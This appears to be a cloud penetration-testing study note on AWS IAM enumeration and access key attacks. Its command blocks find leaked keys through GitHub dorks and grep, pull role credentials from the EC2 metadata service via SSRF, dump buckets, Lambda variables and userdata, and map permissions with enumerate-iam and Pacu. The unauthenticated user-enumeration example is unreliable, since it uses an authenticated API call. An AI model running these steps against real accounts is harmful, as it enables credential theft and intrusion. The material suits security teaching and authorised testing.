# 01.2 — IAM Enumeration and Access Key Attacks

## What This Note Covers

How to enumerate IAM without credentials, how to validate and enumerate with credentials, how to find exposed access keys in the wild, and how to determine what a compromised key can do.

---

## Phase 1: Unauthenticated IAM Enumeration

Before you have any credentials, there's still information you can extract about an AWS account and its IAM configuration.

### 1. Account ID Discovery

The AWS account ID (12-digit number) is needed for constructing ARNs and cross-account attacks. It's often discoverable without credentials.

```bash
# Method 1: From a public S3 bucket policy (bucket policies often contain account IDs)
aws s3api get-bucket-policy --bucket TARGET-BUCKET --no-sign-request

# Method 2: From an EC2 AMI ID — public AMIs contain the owner's account ID
aws ec2 describe-images --image-ids ami-0abc123456 --region us-east-1 \
  --query 'Images[].OwnerId'

# Method 3: From an SNS topic ARN (sometimes exposed in app source code)
# ARN format: arn:aws:sns:us-east-1:ACCOUNT_ID:TopicName

# Method 4: Error messages — unauthenticated API calls to non-existent resources 
# sometimes leak account IDs in error responses
```

### 2. Username / Principal Enumeration (No Credentials)

AWS has a quirk: when you try to attach a policy to a non-existent principal, the error is different from trying to attach to a principal that exists.

```bash
# This technique exploits the difference in error messages
# to enumerate valid IAM usernames without credentials
# Tool: https://github.com/tal7aouy/aws-enum-users

# Conceptually:
aws iam create-policy-version \
  --policy-arn arn:aws:iam::TARGET_ACCOUNT:policy/EXISTING_POLICY \
  --policy-document file://policy.json

# Error: "EntityAlreadyExists" → account + user exists
# Error: "NoSuchEntity" → user doesn't exist
```

> [!tip] User enumeration is low-value alone
> Knowing usernames without credentials doesn't give you direct access. Combine with password spraying against the AWS console login (rare — most orgs use SSO) or focus on finding leaked credentials for those users.

### 3. S3 Bucket Discovery (Unauthenticated)

S3 bucket names are globally unique. Enumeration is possible without credentials.

```bash
# Check if a bucket exists and is public
aws s3 ls s3://TARGET-BUCKET --no-sign-request

# Try to list bucket contents without auth
curl https://TARGET-BUCKET.s3.amazonaws.com/

# If bucket has public-read ACL, returns XML listing of objects
# If private, returns: AccessDenied or NoSuchBucket
```

This is covered in depth in [[01.4 — S3 Attacks]].

## Phase 2: With Credentials — Validate and Enumerate

### Step 1: Validate the Credentials

The very first thing you do with any found credential pair.

```bash
# Validate AWS access key pair
aws sts get-caller-identity \
  --access-key-id AKIA... \
  --secret-access-key ...

# Success response:
{
    "UserId": "AIDAI...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/jenkins-deploy"
}

# The Arn tells you:
# - Account ID: 123456789012
# - Type: user (vs role, root)
# - Username: jenkins-deploy
```

**Interpreting the UserId prefix:**

| Prefix | Identity Type |
|---|---|
| `AIDA` | IAM User |
| `AROA` | IAM Role |
| `ASIA` | Temporary credentials (assumed role) |
| `AGPA` | IAM Group |
| `AIPA` | EC2 Instance Profile |
| `ANPA` | Managed Policy |
| `AKIA` | Access Key (long-term, IAM user) |

### Step 2: Enumerate Permissions

The challenge: IAM doesn't have a single "list your permissions" API. You have to enumerate policies attached to the user, their groups, and any inline policies.

**Manual enumeration:**

```bash
# Get the username from caller identity
USERNAME="jenkins-deploy"

# List directly attached managed policies
aws iam list-attached-user-policies --user-name $USERNAME

# List inline policies
aws iam list-user-policies --user-name $USERNAME

# Get inline policy content
aws iam get-user-policy --user-name $USERNAME --policy-name POLICY_NAME

# Get managed policy content
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/POLICY_NAME
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/POLICY_NAME \
  --version-id v1

# Check which groups the user belongs to
aws iam list-groups-for-user --user-name $USERNAME

# For each group, check policies
aws iam list-attached-group-policies --group-name GROUP_NAME
aws iam list-group-policies --group-name GROUP_NAME
```

**Automated enumeration — enumerate-iam:**

```bash
# Install
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip3 install -r requirements.txt

# Run — brute-forces which API calls the credential can make
python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key ... \
  --region us-east-1

# Output shows which calls succeed (allowed) and which fail (denied)
# This gives you a practical permission map
```

> [!tip] enumerate-iam makes noise
> It fires hundreds of API calls. CloudTrail will log all of them. In a real engagement, this is noisy. Use with awareness of detection, or reserve for test environments.

**Automated enumeration — Pacu:**

```bash
python3 pacu.py
# Import keys
> set_keys
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
```

## Phase 3: Finding Exposed Access Keys

This is often the initial foothold. Keys get leaked constantly.

### Source 1: GitHub / Public Code Repositories

The most common source of leaked AWS credentials.

```bash
# Tool: truffleHog — scans git history for secrets
pip3 install trufflehog
trufflehog github --repo https://github.com/target/repo

# Tool: gitleaks
brew install gitleaks
gitleaks detect --source /path/to/cloned/repo

# Manual GitHub search (dorks):
# site:github.com "AKIA" "aws_secret_access_key"
# site:github.com "AWS_ACCESS_KEY_ID" filename:.env
# site:github.com "aws_access_key_id" extension:py
```

### Source 2: Environment Variables in Application Code

Developers hardcode credentials in:
- `.env` files committed to repos
- Docker Compose files
- Kubernetes ConfigMaps/Secrets (base64 encoded, not encrypted)
- CI/CD pipeline configs (GitHub Actions `env:`, Jenkins files)

```bash
# Search for .env files in GitHub
# site:github.com filename:.env AWS_ACCESS_KEY_ID

# In a cloned repo, search for credential patterns
grep -r "AKIA" . --include="*.py" --include="*.js" --include="*.env" --include="*.yml"
grep -r "aws_secret_access_key" . -i
```

### Source 3: EC2 Instance Metadata Service (SSRF)

If an application on an EC2 instance has an SSRF vulnerability, the metadata service leaks temporary role credentials. Covered fully in [[01.3 — Metadata Service Attacks]].

```bash
# From inside an EC2 instance (or via SSRF):
# Step 1: Get the role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get the credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Returns JSON with:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",  # Required for temporary credentials
  "Expiration": "2024-01-01T12:00:00Z"
}
```

### Source 4: S3 Bucket Contents

Misconfigured public S3 buckets frequently contain:
- `.env` files
- Configuration files with hardcoded credentials
- Application backups with embedded secrets
- Database dumps

```bash
# List public bucket contents
aws s3 ls s3://target-bucket --no-sign-request --recursive

# Download everything
aws s3 sync s3://target-bucket ./local-copy --no-sign-request

# Search downloaded content for credentials
grep -r "AKIA\|aws_secret\|aws_access" ./local-copy -i
```

### Source 5: Lambda Function Configuration

Lambda environment variables are visible in the console and via the API to anyone with `lambda:GetFunctionConfiguration`.

```bash
# List Lambda functions
aws lambda list-functions --region us-east-1

# Get environment variables (where devs sometimes put secrets)
aws lambda get-function-configuration \
  --function-name TARGET_FUNCTION \
  --region us-east-1 \
  --query 'Environment.Variables'
```

### Source 6: EC2 Userdata

EC2 instance startup scripts (userdata) are often stored with credentials to bootstrap applications.

```bash
# Get userdata for a running instance
aws ec2 describe-instance-attribute \
  --instance-id i-0abc123456 \
  --attribute userData \
  --query 'UserData.Value' \
  --output text | base64 --decode
```

## Phase 4: Using Temporary Credentials

When you get temporary credentials (from AssumeRole or metadata service), they come with a **session token** that must be included in every request.

```bash
# Export temporary credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify
aws sts get-caller-identity

# Or configure as a profile
aws configure set aws_access_key_id ASIA... --profile stolen
aws configure set aws_secret_access_key ... --profile stolen
aws configure set aws_session_token ... --profile stolen
aws sts get-caller-identity --profile stolen
```

> [!warning] Temporary credentials expire
> Credentials from the metadata service typically expire in 1-6 hours. If you need long-term persistence, you need to create permanent credentials (new IAM user + access key) or backdoor a role — covered in [[MODULE 9 — Cloud Persistence]].

## Quick Reference — Access Key Attack Chain

```bash
# 1. Find the key (github, env file, s3, metadata, lambda config)

# 2. Validate
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...

# 3. Set credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

# 4. Enumerate permissions
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# 5. Check for privilege escalation paths
python3 pacu.py → run iam__privesc_scan

# 6. Enumerate all accessible resources
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws lambda list-functions --region us-east-1
aws secretsmanager list-secrets --region us-east-1
aws iam list-users  # only if iam:ListUsers is allowed
```
